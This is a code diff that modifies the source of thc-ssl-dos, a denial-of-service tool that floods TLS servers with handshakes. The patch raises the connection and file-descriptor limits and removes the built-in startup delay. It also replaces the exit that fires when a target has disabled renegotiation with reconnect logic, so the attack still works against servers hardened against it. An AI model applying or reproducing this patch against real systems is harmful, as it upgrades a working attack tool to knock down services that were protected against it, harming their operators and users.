@@ -3,9 +3,10 @@
 #include <getopt.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <sys/resource.h>
 
 
-#define MAX_PEERS		(999)
+#define MAX_PEERS		  (1023)
 #define DEFAULT_PEERS		(400)
 #define PROGRAM_NAME		"thc-ssl-dos"
 #define TO_TCP_CONNECT		(10)	/* 10 second TCP connect() timeout */
@@ -129,6 +130,15 @@ init_default(void)
 static void
 init_vars(void)
 {
+	//set ulimit 
+	struct rlimit rl;
+	rl.rlim_cur=65535;
+	rl.rlim_max=65535;
+	if (setrlimit(RLIMIT_NOFILE,&rl)!=0){
+		fprintf(stderr, strerror(errno));
+		exit(-1);
+	}
+
 	SSL_library_init();
 	SSL_load_error_strings();
 	g_opt.ctx = SSL_CTX_new(SSLv23_method()); 
@@ -188,6 +198,10 @@ do_getopt(int argc, char *argv[])
 			break;
 		case 'l':
 			g_opt.n_max_peers = atoi(optarg);
+			if(g_opt.n_max_peers>=1023){
+				fprintf(stderr,"max connection must less than 1023");
+				exit(-1);
+			}
 			break;
 		case 'h':
 		default:
@@ -225,20 +239,21 @@ do_getopt(int argc, char *argv[])
 	if (g_opt.ip == -1)
 		ERREXIT("ERROR: Invalid target IP address\n");
 
-#if 1
-	if (skipdelay_flag == 0)
-	{
-		printf("Waiting for script kiddies to piss off.");
-		fflush(stdout);
-		for (c = 0; c < 15; c++)
-		{
-			sleep(1);
-			printf(".");
-			fflush(stdout);
-		}
-		printf("\nThe force is with those who read the source...\n");
-	}
-#endif
+/**no wait**/
+// #if 1
+// 	if (skipdelay_flag == 0)
+// 	{
+// 		printf("Waiting for script kiddies to piss off.");
+// 		fflush(stdout);
+// 		for (c = 0; c < 15; c++)
+// 		{
+// 			sleep(1);
+// 			printf(".");
+// 			fflush(stdout);
+// 		}
+// 		printf("\nThe force is with those who read the source...\n");
+// 	}
+// #endif
 }
 
 static void
@@ -306,14 +321,20 @@ ssl_handshake_io(struct _peer *p)
 	if ((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE))
 	{
 		/* Renegotiation is not supported */
-		if (g_opt.stat.total_renegotiations <= 0)
-		{
-			fprintf(stderr, ""
-"ERROR: Target has disabled renegotiations.\n"
-"Use your own skills to modify the source to test/attack\n"
-"the target [hint: TCP reconnect for every handshake].\n");
-			exit(-1);
-		}
+// 		if (g_opt.stat.total_renegotiations <= 0)
+// 		{
+// 			fprintf(stderr, ""
+// "ERROR: Target has disabled renegotiations.\n"
+// "Use your own skills to modify the source to test/attack\n"
+// "the target [hint: TCP reconnect for every handshake].\n");
+// 			exit(-1);
+// 		}
+
+
+
+//close and will reconnect the connection when target has disabled renegotiations
+		PEER_disconnect(p);
+		return 0;
 	}
 
 	SSL_set_rw(p, ret);
